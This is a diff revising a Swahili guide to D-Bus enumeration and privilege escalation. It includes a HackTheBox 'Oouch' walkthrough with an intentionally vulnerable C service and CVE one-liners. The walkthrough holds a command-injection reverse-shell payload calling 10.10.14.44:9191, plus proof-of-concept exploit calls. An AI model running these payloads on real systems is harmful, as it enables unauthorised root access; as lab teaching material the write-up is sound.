@@ -4,33 +4,37 @@
 
 ## **GUI enumeration**
 
-D-Bus inatumika kama mjumbe wa mawasiliano kati ya michakato (IPC) katika mazingira ya desktop ya Ubuntu. Katika Ubuntu, uendeshaji wa sambamba wa mabasi kadhaa ya ujumbe unaonekana: basi la mfumo, ambalo linatumika hasa na **huduma zenye mamlaka ili kufichua huduma zinazohusiana katika mfumo mzima**, na basi la kikao kwa kila mtumiaji aliyeingia, likifichua huduma zinazohusiana tu na mtumiaji huyo maalum. Kipaumbele hapa ni hasa kwenye basi la mfumo kutokana na uhusiano wake na huduma zinazotembea kwa mamlaka ya juu (mfano, root) kwani lengo letu ni kuinua mamlaka. Inabainika kwamba usanifu wa D-Bus unatumia 'router' kwa kila basi la kikao, ambayo inawajibika kwa kuelekeza ujumbe wa wateja kwa huduma zinazofaa kulingana na anwani iliyotolewa na wateja kwa huduma wanayotaka kuwasiliana nayo.
+D-Bus hutumika kama mpatanishi wa inter-process communications (IPC) katika mazingira ya Ubuntu desktop. Kwenye Ubuntu, kuna uendeshaji sambamba wa message buses kadhaa: system bus, ambayo hutumika hasa na **privileged services kufichua services zinazohusiana na mfumo mzima**, na session bus kwa kila user aliyeingia, ikifichua services zinazohusiana tu na user huyo husika. Hapa mkazo uko hasa kwenye system bus kwa sababu unahusiana na services zinazoendeshwa kwa higher privileges (kwa mfano, root) kwa kuwa lengo letu ni kuongeza privileges. Inaonekana kwamba architecture ya D-Bus hutumia 'router' kwa kila session bus, ambayo ina jukumu la kuelekeza client messages kwenda kwa services sahihi kulingana na address iliyobainishwa na clients kwa service wanayotaka kuwasiliana nayo.
 
-Huduma kwenye D-Bus zin defined na **vitu** na **mifumo** wanayofichua. Vitu vinaweza kulinganishwa na mifano ya darasa katika lugha za OOP za kawaida, ambapo kila mfano unatambulika kwa kipekee na **njia ya kitu**. Njia hii, kama njia ya mfumo wa faili, inatambulisha kwa kipekee kila kitu kinachofichuliwa na huduma. Msingi muhimu wa utafiti ni **org.freedesktop.DBus.Introspectable** interface, yenye njia moja, Introspect. Njia hii inarudisha uwakilishi wa XML wa njia zinazoungwa mkono za kitu, ishara, na mali, huku ikizingatia hapa njia huku ikiacha mali na ishara.
+Services kwenye D-Bus hufafanuliwa na **objects** na **interfaces** wanazofichua. Objects zinaweza kufananishwa na class instances katika lugha za kawaida za OOP, huku kila instance ikitambulishwa kwa kipekee na **object path**. Path hii, sawa na filesystem path, hutambulisha kwa kipekee kila object iliyofichuliwa na service. Interface muhimu kwa utafiti ni **org.freedesktop.DBus.Introspectable** interface, yenye method moja tu, Introspect. Method hii hurejesha uwakilishi wa XML wa methods, signals, na properties zinazotumika na object, huku hapa mkazo ukiwa kwenye methods na kuacha properties na signals.
 
-Kwa mawasiliano na kiunganishi cha D-Bus, zana mbili zilitumika: zana ya CLI inayoitwa **gdbus** kwa urahisi wa kuitisha njia zinazofichuliwa na D-Bus katika scripts, na [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), zana ya GUI inayotumia Python iliyoundwa kuorodhesha huduma zinazopatikana kwenye kila basi na kuonyesha vitu vilivyomo ndani ya kila huduma.
+Kwa mawasiliano na D-Bus interface, zilitumika tools mbili: CLI tool iitwayo **gdbus** kwa urahisi wa kuinvoke methods zilizofichuliwa na D-Bus katika scripts, na [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), tool ya GUI inayotegemea Python iliyoundwa kuenumerate services zinazopatikana kwenye kila bus na kuonyesha objects zilizo ndani ya kila service.
 ```bash
 sudo apt-get install d-feet
+```
+Ikiwa unachunguza **session bus**, thibitisha kwanza anwani ya sasa:
+```bash
+echo "$DBUS_SESSION_BUS_ADDRESS"
 ```
 ![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)
 
 ![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)
 
-Katika picha ya kwanza, huduma zilizoorodheshwa na mfumo wa D-Bus zinaonyeshwa, huku **org.debin.apt** ikisisitizwa hasa baada ya kuchagua kitufe cha System Bus. D-Feet inafanya uchunguzi wa huduma hii kwa vitu, ikionyesha interfaces, methods, properties, na signals za vitu vilivyochaguliwa, kama inavyoonekana katika picha ya pili. Saini ya kila method pia imeelezwa kwa undani.
+Katika picha ya kwanza, huduma zilizosajiliwa na D-Bus system bus zinaonyeshwa, huku **org.debin.apt** ikiwa imeangaziwa mahsusi baada ya kuchagua kitufe cha System Bus. D-Feet huuliza huduma hii kuhusu objects, na kuonyesha interfaces, methods, properties, na signals za objects zilizochaguliwa, kama inavyoonekana kwenye picha ya pili. Signature ya kila method pia inaonyeshwa kwa undani.
 
-Kipengele muhimu ni kuonyeshwa kwa **process ID (pid)** ya huduma na **command line**, ambayo ni muhimu kuthibitisha ikiwa huduma inafanya kazi na haki za juu, muhimu kwa umuhimu wa utafiti.
+Kipengele muhimu ni uonyeshaji wa **process ID (pid)** ya huduma na **command line**, jambo linalofaa kwa kuthibitisha kama huduma inaendeshwa kwa privileges zilizoinuliwa, muhimu kwa uhusiano wa utafiti.
 
-**D-Feet pia inaruhusu mwito wa method**: watumiaji wanaweza kuingiza maelekezo ya Python kama vigezo, ambayo D-Feet inabadilisha kuwa aina za D-Bus kabla ya kuyapeleka kwa huduma.
+**D-Feet pia inaruhusu method invocation**: watumiaji wanaweza kuingiza Python expressions kama parameters, ambazo D-Feet huzibadilisha kuwa D-Bus types kabla ya kuzipitisha kwa huduma.
 
-Hata hivyo, kumbuka kwamba **mbinu zingine zinahitaji uthibitisho** kabla ya kuturuhusu kuzitumia. Tutazipuuza mbinu hizi, kwani lengo letu ni kuongeza haki zetu bila hati za kuingia kwanza.
+Hata hivyo, kumbuka kuwa **methods fulani zinahitaji authentication** kabla ya kuturuhusu kuzinvoke. Tutapuuza methods hizi, kwa kuwa lengo letu ni kuinua privileges zetu bila credentials kwanza.
 
-Pia kumbuka kwamba baadhi ya huduma zinafanya uchunguzi wa huduma nyingine ya D-Bus inayoitwa org.freedeskto.PolicyKit1 ikiwa mtumiaji anapaswa kuruhusiwa kufanya vitendo fulani au la.
+Pia kumbuka kuwa baadhi ya services huuliza huduma nyingine ya D-Bus inayoitwa org.freedeskto.PolicyKit1 kama user anapaswa kuruhusiwa kufanya actions fulani au la.
 
 ## **Cmd line Enumeration**
 
-### Orodha ya Vitu vya Huduma
+### List Service Objects
 
-Inawezekana kuorodhesha interfaces za D-Bus zilizofunguliwa kwa:
+Inawezekana kuorodhesha opened D-Bus interfaces kwa:
 ```bash
 busctl list #List D-Bus interfaces
 
@@ -54,9 +58,16 @@ org.freedesktop.PolicyKit1               - -               -                (act
 org.freedesktop.hostname1                - -               -                (activatable) -                         -
 org.freedesktop.locale1                  - -               -                (activatable) -                         -
 ```
+Huduma zilizoandikwa kama **`(activatable)`** ni za kuvutia hasa kwa sababu **bado hazijaendeshwa**, lakini ombi la bus linaweza kuzianzisha unapozihitaji. Usisome tu `busctl list`; linganisha majina hayo na binaries halisi ambazo zingetekelezwa.
+```bash
+ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
+grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
+```
+Hiyo hukwambia haraka ni njia gani ya `Exec=` itaanza kwa jina linaloweza kuamilishwa na chini ya utambulisho gani. Ikiwa binary au mnyororo wake wa utekelezaji imelindwa kwa udhaifu, huduma isiyofanya kazi bado inaweza kuwa njia ya privilege-escalation.
+
 #### Connections
 
-[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Wakati mchakato unapoanzisha muunganisho na basi, basi inatoa muunganisho jina maalum la basi linaloitwa _jina la muunganisho la kipekee_. Majina ya basi ya aina hii hayabadiliki—imehakikishwa kuwa hayatabadilika kadri muunganisho unavyokuwepo—na, muhimu zaidi, hayawezi kutumika tena wakati wa maisha ya basi. Hii ina maana kwamba hakuna muunganisho mwingine kwa basi hiyo utapata jina kama hilo la muunganisho wa kipekee, hata kama mchakato huo huo unafunga muunganisho na kuunda mpya. Majina ya muunganisho wa kipekee yanaweza kutambulika kwa urahisi kwa sababu yananza na tabia ya koloni—ambayo kwa kawaida hairuhusiwi.
+[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Wakati mchakato unapoweka connection kwenye bus, bus hugawa connection hiyo jina maalum la bus linaloitwa _unique connection name_. Majina ya bus ya aina hii hayabadiliki—imehakikishwa kuwa hayatabadilika mradi connection ipo—na, muhimu zaidi, hayawezi kutumiwa tena wakati wa maisha ya bus. Hii ina maana kwamba hakuna connection nyingine yoyote kwenye bus hiyo itakayowahi kupewa unique connection name kama hiyo, hata kama mchakato uleule utafunga connection kwenda kwenye bus na kuunda mpya. Unique connection names ni rahisi kutambua kwa sababu huanza na herufi ya koloni—ambayo vinginevyo hairuhusiwi.
 
 ### Service Object Info
 
@@ -120,9 +131,17 @@ cap_mknod cap_lease cap_audit_write cap_audit_control
 cap_setfcap cap_mac_override cap_mac_admin cap_syslog
 cap_wake_alarm cap_block_suspend cap_audit_read
 ```
-### Orodha ya Interfaces za Kitu cha Huduma
+Pia pia jina la bus na `systemd` unit yake na njia ya executable:
+```bash
+systemctl status dbus-server.service --no-pager
+systemctl cat dbus-server.service
+namei -l /root/dbus-server
+```
+Hii inajibu swali la kiutendaji linalohusika wakati wa privesc: **ikiwa method call inafanikiwa, ni binary na unit gani halisi itafanya hatua hiyo?**
 
-Unahitaji kuwa na ruhusa za kutosha.
+### Orodhesha Interfaces za Service Object
+
+Unahitaji kuwa na permissions za kutosha.
 ```bash
 busctl tree htb.oouch.Block #Get Interfaces of the service object
 
@@ -132,7 +151,7 @@ busctl tree htb.oouch.Block #Get Interfaces of the service object
 ```
 ### Introspect Interface of a Service Object
 
-Kumbuka jinsi katika mfano huu ilichaguliwa interface ya hivi karibuni iliyogunduliwa kwa kutumia parameter ya `tree` (_ona sehemu ya awali_):
+Tambua jinsi katika mfano huu ilichaguliwa interface ya hivi karibuni iliyogunduliwa kwa kutumia parameter `tree` (_ona sehemu iliyotangulia_):
 ```bash
 busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface
 
@@ -150,24 +169,52 @@ org.freedesktop.DBus.Properties     interface -         -            -
 .Set                                method    ssv       -            -
 .PropertiesChanged                  signal    sa{sv}as  -            -
 ```
-Note njia `.Block` ya interface `htb.oouch.Block` (ile ambayo tunavutiwa nayo). "s" ya safu nyingine inaweza kumaanisha kwamba inatarajia string.
+Note the method `.Block` of the interface `htb.oouch.Block` (ile tunalopenda). Herufi "s" ya safu wima nyingine huenda ikimaanisha kwamba inatarajia string.
+
+Kabla ya kujaribu chochote cha hatari, thibitisha kwanza njia ya **read-oriented** au njia nyingine yenye hatari ndogo. Hii hutenganisha hali tatu kwa uwazi: syntax isiyo sahihi, inafikiwa lakini imekataliwa, au inafikiwa na inaruhusiwa.
+```bash
+busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
+gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
+```
+### Correlate D-Bus Methods with Policies and Actions
+
+Introspection inakuonyesha **nini** unaweza kuita, lakini haikuambii **kwa nini** wito unaruhusiwa au unakataliwa. Kwa triage ya kweli ya privesc kawaida unahitaji kukagua **tabaka tatu pamoja**:
+
+1. **Activation metadata** (`.service` files or `SystemdService=`) ili kujua ni binary na unit gani itakayotumika kweli.
+2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) ili kujua nani anaweza `own`, `send_destination`, au `receive_sender`.
+3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`) ili kujua default authorization model (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).
+
+Useful commands:
+```bash
+grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
+grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
+grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
+pkaction --verbose
+```
+Usidhani **1:1 mapping** kati ya D-Bus method na Polkit action. Method ileile inaweza kuchagua action tofauti kutegemea object inayobadilishwa au runtime context. Kwa hiyo workflow ya vitendo ni:
+
+1. `busctl introspect` / `gdbus introspect`
+2. `pkaction --verbose` na grep faili husika za `.policy`
+3. low-risk live probes kwa `busctl call`, `gdbus call`, au `dbusmap --enable-probes --null-agent`
+
+Proxy au compatibility services zinastahili umakini wa ziada. **root-running proxy** inayoforward requests kwenda D-Bus service nyingine kupitia connection yake yenyewe iliyowekwa mapema inaweza kwa bahati mbaya kufanya backend ichukulie kila request kama inatoka kwa UID 0 isipokuwa identity ya caller wa awali ihalalishwe tena.
 
 ### Monitor/Capture Interface
 
-Kwa ruhusa za kutosha (tu `send_destination` na `receive_sender` ruhusa hazitoshi) unaweza **kuchunguza mawasiliano ya D-Bus**.
+Kwa privileges za kutosha (just `send_destination` and `receive_sender` privileges aren't enough) unaweza **monitor D-Bus communication**.
 
-Ili **kuchunguza** **mawasiliano** unahitaji kuwa **root.** Ikiwa bado unakutana na matatizo ukiwa root angalia [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) na [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)
+Ili **monitor** **communication** utahitaji kuwa **root.** Ukiendelea kuona matatizo ukiwa root angalia [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) na [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)
 
 > [!WARNING]
-> Ikiwa unajua jinsi ya kuunda faili ya usanidi ya D-Bus ili **kuruhusu watumiaji wasiokuwa root kunusa** mawasiliano tafadhali **wasiliana nami**!
+> Ikiwa unajua jinsi ya kusanidi D-Bus config file ili **kuruhusu non root users kusniff** communication tafadhali **wasiliana nami**!
 
-Njia tofauti za kuchunguza:
+Njia tofauti za monitor:
 ```bash
 sudo busctl monitor htb.oouch.Block #Monitor only specified
 sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
 sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
 ```
-Katika mfano ufuatao, kiolesura `htb.oouch.Block` kinachunguzwa na **ujumbe "**_**lalalalal**_**" unatumwa kupitia mawasiliano mabaya**:
+Katika mfano ufuatao, interface `htb.oouch.Block` inafuatiliwa na **ujumbe "**_**lalalalal**_**" unatumwa kupitia mawasiliano mabaya**:
 ```bash
 busctl monitor htb.oouch.Block
 
@@ -186,15 +233,18 @@ MESSAGE "s" {
 STRING "Carried out :D";
 };
 ```
-Unaweza kutumia `capture` badala ya `monitor` kuhifadhi matokeo katika faili ya pcap.
+Unaweza kutumia `capture` badala ya `monitor` kuhifadhi matokeo kwenye faili ya **pcapng** ambayo Wireshark inaweza kufungua:
+```bash
+sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
+sudo busctl capture > system-bus.pcapng
+```
+#### Kuchuja kelele zote <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>
 
-#### Filtering all the noise <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>
-
-Ikiwa kuna taarifa nyingi sana kwenye basi, pitisha sheria ya mechi kama ifuatavyo:
+Ikiwa kuna taarifa nyingi sana kwenye bus, pitisha match rule kama hivi:
 ```bash
 dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
 ```
-Mifumo mingi inaweza kufafanuliwa. Ikiwa ujumbe unalingana na _yoyote_ ya mifumo, ujumbe utaandikwa. Kama hivi:
+Sheria nyingi zinaweza kubainishwa. Ikiwa ujumbe unalingana na _lolote_ kati ya sheria, ujumbe utaonyeshwa. Kama hivi:
 ```bash
 dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
 ```
@@ -202,15 +252,15 @@ dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
 ```bash
 dbus-monitor "type=method_call" "type=method_return" "type=error"
 ```
-Tazama [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html) kwa maelezo zaidi kuhusu sintaksia ya sheria za mechi.
+Tazama [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html) kwa maelezo zaidi kuhusu match rule syntax.
 
-### Zaidi
+### More
 
-`busctl` ina chaguzi zaidi, [**pata zote hapa**](https://www.freedesktop.org/software/systemd/man/busctl.html).
+`busctl` ina chaguo zaidi, [**pata zote hapa**](https://www.freedesktop.org/software/systemd/man/busctl.html).
 
-## **Hali Hatari**
+## **Vulnerable Scenario**
 
-Kama mtumiaji **qtc ndani ya mwenyeji "oouch" kutoka HTB** unaweza kupata **faili ya usanidi ya D-Bus isiyotarajiwa** iliyoko _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
+Kama user **qtc ndani ya host "oouch" kutoka HTB** unaweza kupata **unexpected D-Bus config file** iliyopo katika _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->
 
@@ -231,9 +281,9 @@ Kama mtumiaji **qtc ndani ya mwenyeji "oouch" kutoka HTB** unaweza kupata **fail
 
 </busconfig>
 ```
-Kumbuka kutoka kwa usanidi wa awali kwamba **utahitaji kuwa mtumiaji `root` au `www-data` ili kutuma na kupokea taarifa** kupitia mawasiliano haya ya D-BUS.
+Kumbuka kutoka kwenye usanidi uliopita kwamba **utahitaji kuwa mtumiaji `root` au `www-data` ili kutuma na kupokea taarifa** kupitia mawasiliano haya ya D-BUS.
 
-Kama mtumiaji **qtc** ndani ya kontena la docker **aeb4525789d8** unaweza kupata baadhi ya msimbo unaohusiana na dbus katika faili _/code/oouch/routes.py._ Huu ndio msimbo wa kuvutia:
+Kama mtumiaji **qtc** ndani ya docker container **aeb4525789d8** unaweza kupata baadhi ya code zinazohusiana na dbus katika faili _/code/oouch/routes.py._ Hii ndiyo code ya kuvutia:
 ```python
 if primitive_xss.search(form.textfield.data):
 bus = dbus.SystemBus()
@@ -245,14 +295,14 @@ response = block_iface.Block(client_ip)
 bus.close()
 return render_template('hacker.html', title='Hacker')
 ```
-Kama unavyoona, inafanya **kuungana na kiolesura cha D-Bus** na kutuma kwa **"Block" function** "client_ip".
+Kama unavyoona, inajiunganisha na **D-Bus interface** na kutuma kwa **"Block" function** thamani ya "client_ip".
 
-Katika upande mwingine wa muunganisho wa D-Bus kuna binary iliyokamilishwa kwa C inayoendesha. Hiki ni **kusikiliza** katika muunganisho wa D-Bus **kwa anwani ya IP na inaita iptables kupitia `system` function** kuzuia anwani ya IP iliyotolewa.\
-**Kuitwa kwa `system` kuna udhaifu kwa makusudi kwa ajili ya kuingilia amri**, hivyo payload kama ifuatavyo itaunda shell ya kurudi: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
+Upande wa pili wa connection ya D-Bus kuna binary fulani ya C iliyocompiled inayoendeshwa. Hii code inasikiliza katika connection ya D-Bus **kwa IP address na inaita iptables kupitia `system` function** ili ku-block IP address iliyotolewa.\
+**Call ya `system` imewekwa kuwa vulnerable kwa makusudi kwa command injection**, hivyo payload kama ifuatayo itaunda reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
 
-### Fanya hivyo
+### Exploit it
 
-Mwisho wa ukurasa huu unaweza kupata **kanuni kamili ya C ya programu ya D-Bus**. Ndani yake unaweza kupata kati ya mistari 91-97 **jinsi ya `D-Bus object path`** **na `interface name`** **zinavyosajiliwa**. Taarifa hii itakuwa muhimu kutuma taarifa kwa muunganisho wa D-Bus:
+Mwisho wa ukurasa huu unaweza kupata **complete C code of the D-Bus application**. Ndani yake unaweza kupata kati ya mistari 91-97 **jinsi `D-Bus object path`** na **`interface name`** zilivyo **registered**. Taarifa hii itahitajika ili kutuma taarifa kwenye connection ya D-Bus:
 ```c
 /* Install the object */
 r = sd_bus_add_object_vtable(bus,
@@ -262,13 +312,13 @@ r = sd_bus_add_object_vtable(bus,
 block_vtable,
 NULL);
 ```
-Pia, katika mstari wa 57 unaweza kupata kwamba **njia pekee iliyosajiliwa** kwa mawasiliano haya ya D-Bus inaitwa `Block`(_**Ndio maana katika sehemu inayofuata payloads zitatumwa kwa kitu cha huduma `htb.oouch.Block`, interface `/htb/oouch/Block` na jina la njia `Block`**_):
+Pia, katika mstari wa 57 unaweza kuona kwamba **njia pekee iliyosajiliwa** kwa mawasiliano haya ya D-Bus inaitwa `Block`(_**Ndiyo maana katika sehemu ifuatayo payloads zitatumwa kwa service object `htb.oouch.Block`, interface `/htb/oouch/Block` na method name `Block`**_):
 ```c
 SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
 ```
 #### Python
 
-Mfuatano wa msimbo wa python utatuma mzigo kwa muunganisho wa D-Bus kwa njia ya `Block` method kupitia `block_iface.Block(runme)` (_kumbuka kwamba ilitolewa kutoka sehemu ya awali ya msimbo_):
+Msimbo wa python ufuatao utatuma payload kwenye muunganisho wa D-Bus kwa `Block` method kupitia `block_iface.Block(runme)` (_note that it was extracted from the previous chunk of code_):
 ```python
 import dbus
 bus = dbus.SystemBus()
@@ -278,18 +328,18 @@ runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
 response = block_iface.Block(runme)
 bus.close()
 ```
-#### busctl na dbus-send
+#### busctl and dbus-send
 ```bash
 dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
 ```
-- `dbus-send` ni chombo kinachotumika kutuma ujumbe kwa “Message Bus”
-- Message Bus – Programu inayotumiwa na mifumo kuwezesha mawasiliano kati ya programu kwa urahisi. Inahusiana na Message Queue (ujumbe umeandikwa kwa mpangilio) lakini katika Message Bus ujumbe unatumwa kwa mfano wa usajili na pia ni wa haraka sana.
-- “-system” tag inatumika kutaja kwamba ni ujumbe wa mfumo, si ujumbe wa kikao (kwa kawaida).
-- “–print-reply” tag inatumika kuchapisha ujumbe wetu ipasavyo na kupokea majibu yoyote kwa muundo unaoweza kusomeka na binadamu.
-- “–dest=Dbus-Interface-Block” Anwani ya kiolesura cha Dbus.
-- “–string:” – Aina ya ujumbe tunayotaka kutuma kwa kiolesura. Kuna mifumo kadhaa ya kutuma ujumbe kama vile double, bytes, booleans, int, objpath. Kati ya hizi, “object path” ni muhimu tunapotaka kutuma njia ya faili kwa kiolesura cha Dbus. Tunaweza kutumia faili maalum (FIFO) katika kesi hii kupitisha amri kwa kiolesura kwa jina la faili. “string:;” – Hii ni kuitisha tena njia ya kitu ambapo tunaweka faili/amri ya FIFO reverse shell.
+- `dbus-send` ni zana inayotumika kutuma ujumbe kwa “Message Bus”
+- Message Bus – Programu inayotumiwa na mifumo ili kufanya mawasiliano kati ya applications kwa urahisi. Inahusiana na Message Queue (ujumbe hupangwa kwa mfululizo) lakini katika Message Bus ujumbe hutumwa katika modeli ya subscription na pia ni ya haraka sana.
+- Tag “-system” hutumiwa kuonyesha kwamba huu ni ujumbe wa system, si session message (kwa default).
+- Tag “–print-reply” hutumiwa kuchapisha ujumbe wetu ipasavyo na kupokea replies zozote katika muundo unaosomeka na binadamu.
+- “–dest=Dbus-Interface-Block” Anwani ya Dbus interface.
+- “–string:” – Aina ya ujumbe tunayotaka kutuma kwa interface. Kuna formats kadhaa za kutuma ujumbe kama double, bytes, booleans, int, objpath. Kati ya hizi, “object path” ni muhimu tunapotaka kutuma path ya file kwa Dbus interface. Tunaweza kutumia file maalum (FIFO) katika hali hii kupitisha command kwa interface kwa jina la file. “string:;” – Hii ni kuita object path tena ambapo tunaweka file/command ya FIFO reverse shell.
 
-_Kumbuka kwamba katika `htb.oouch.Block.Block`, sehemu ya kwanza (`htb.oouch.Block`) inarejelea kitu cha huduma na sehemu ya mwisho (`.Block`) inarejelea jina la njia._
+_Note that in `htb.oouch.Block.Block`, the first part (`htb.oouch.Block`) references the service object and the last part (`.Block`) references the method name._
 
 ### C code
 ```c:d-bus_server.c
@@ -432,75 +482,71 @@ sd_bus_unref(bus);
 return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
 }
 ```
-## Msaada wa Kuorodhesha Kiotomatiki (2023-2025)
+## Automated Enumeration Helpers (2023-2025)
 
-Kuorodhesha uso mkubwa wa shambulio la D-Bus kwa mikono kwa kutumia `busctl`/`gdbus` haraka inakuwa ngumu. Zana mbili ndogo za FOSS zilizotolewa katika miaka ya hivi karibuni zinaweza kuongeza kasi wakati wa shughuli za red-team au CTF:
+Enumeration ya surface kubwa ya D-Bus kwa mikono kwa `busctl`/`gdbus` haraka huwa ya kuchosha. Vifaa viwili vidogo vya FOSS vilivyotolewa katika miaka michache iliyopita vinaweza kuharakisha kazi wakati wa red-team au CTF engagements:
 
-### dbusmap ("Nmap kwa D-Bus")
-* Mwandishi: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
-* Imeandikwa kwa C; binary moja ya static (<50 kB) inayopita kila njia ya kitu, inavuta `Introspect` XML na kuipanga kwa PID/UID inayomiliki.
-* Bendera muhimu:
+### dbusmap ("Nmap for D-Bus")
+* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
+* Imeandikwa kwa C; single static binary (<50 kB) inayopita kila object path, kuchukua `Introspect` XML na kuimapa kwa owning PID/UID.
+* Useful flags:
 ```bash
-# Orodhesha kila huduma kwenye *sistema* bus na uondoe njia zote zinazoweza kuitwa
+# Orodhesha kila service kwenye *system* bus na dumka methods zote zinazoweza kuitwa
 sudo dbus-map --dump-methods
 
-# Chunguza kwa nguvu njia/mali unazoweza kufikia bila Polkit prompts
+# Chunguza kwa bidii methods/properties unazoweza kufikia bila Polkit prompts
 sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
 ```
-* Zana hii inaashiria majina maarufu yasiyo na ulinzi kwa `!`, ikifunua mara moja huduma ambazo unaweza *miliki* (kuchukua) au wito wa njia ambazo zinaweza kufikiwa kutoka kwenye shell isiyo na haki.
+* Tool hii huweka alama well-known names zisizo protected kwa `!`, mara moja ikionyesha services unazoweza *own* (take over) au method calls zinazofikiwa kutoka kwenye unprivileged shell.
 
 ### uptux.py
-* Mwandishi: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
-* Skripti ya Python pekee inayotafuta njia *zinazoweza kuandikwa* katika vitengo vya systemd **na** faili za sera za D-Bus zenye ruhusa nyingi kupita kiasi (mfano `send_destination="*"`).
-* Matumizi ya haraka:
+* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
+* Python-only script inayotafuta paths *writable* kwenye systemd units **na** D-Bus policy files zenye ruhusa kupita kiasi (mfano `send_destination="*"`).
+* Quick usage:
 ```bash
-python3 uptux.py -n          # fanya ukaguzi wote lakini usiandike faili la log
-python3 uptux.py -d          # wezesha pato la debug la kina
+python3 uptux.py -n          # run all checks but don’t write a log file
+python3 uptux.py -d          # enable verbose debug output
 ```
-* Moduli ya D-Bus inatafuta saraka zilizo chini na kuangazia huduma yoyote inayoweza kudanganywa au kutekwa na mtumiaji wa kawaida:
-* `/etc/dbus-1/system.d/` na `/usr/share/dbus-1/system.d/`
-* `/etc/dbus-1/system-local.d/` (mabadiliko ya muuzaji)
+* D-Bus module hutafuta directories zilizo hapa chini na kuonyesha service yoyote inayoweza spoofed au hijacked na user wa kawaida:
+* `/etc/dbus-1/system.d/` and `/usr/share/dbus-1/system.d/`
+* `/etc/dbus-1/system-local.d/` (vendor overrides)
 
 ---
 
-## Makosa Maarufu ya Kuinua Haki za D-Bus (2024-2025)
+## Notable D-Bus Privilege-Escalation Bugs (2024-2025)
 
-Kuweka macho kwenye CVE zilizochapishwa hivi karibuni husaidia kugundua mifumo isiyo salama katika msimbo wa kawaida. Masuala yafuatayo ya EoP ya ndani yenye athari kubwa yote yanatokana na ukosefu wa uthibitisho/idhinisho kwenye **sistema bus**:
+Kufuatilia CVEs zilizochapishwa hivi karibuni husaidia kubaini mifumo isiyo salama inayofanana kwenye custom code. Mifano miwili mizuri ya hivi karibuni ni:
 
-| Mwaka | CVE | Kipengele | Sababu Kuu | PoC ya Mstari Mmoja |
-|------|-----|-----------|------------|---------------|
-| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (Logitech HID daemon) | Huduma ya mfumo `logid` inafichua interface isiyo na kikomo `org.freedesktop.Logiopsd` inayomruhusu *mtumiaji yeyote* kubadilisha profaili za vifaa na kuingiza amri za shell zisizo na mipaka kupitia nyuzi za macro. | `gdbus call -y -d org.freedesktop.Logiopsd -o /org/freedesktop/Logiopsd -m org.freedesktop.Logiopsd.LoadConfig "/tmp/pwn.yml"` |
-| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.18 | Proxy inayotembea kama root inapeleka majina ya zamani ya bus kwa huduma za nyuma **bila kupeleka UID/Polkit ya mpiga simu**, hivyo kila ombi lililopitishwa linachukuliwa kama UID 0. | `gdbus call -y -d com.deepin.daemon.Grub2 -o /com/deepin/daemon/Grub2 -m com.deepin.daemon.Grub2.SetTimeout 1` |
